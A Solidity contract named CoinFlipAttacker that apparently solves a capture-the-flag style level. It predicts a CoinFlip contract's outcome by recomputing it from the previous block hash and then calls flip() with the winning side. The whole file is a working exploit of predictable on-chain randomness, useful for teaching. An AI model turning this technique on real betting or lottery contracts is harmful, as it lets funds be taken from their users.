// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./CoinFlip.sol";

contract CoinFlipAttacker {

  CoinFlip coinFlip;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor(address _coinFlip) {
    require(_coinFlip != address(0));
    coinFlip = CoinFlip(_coinFlip);
  }

  function attack() external {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 toss = blockValue / FACTOR;
    bool side = toss == 1 ? true : false;

    coinFlip.flip(side);
  }
}
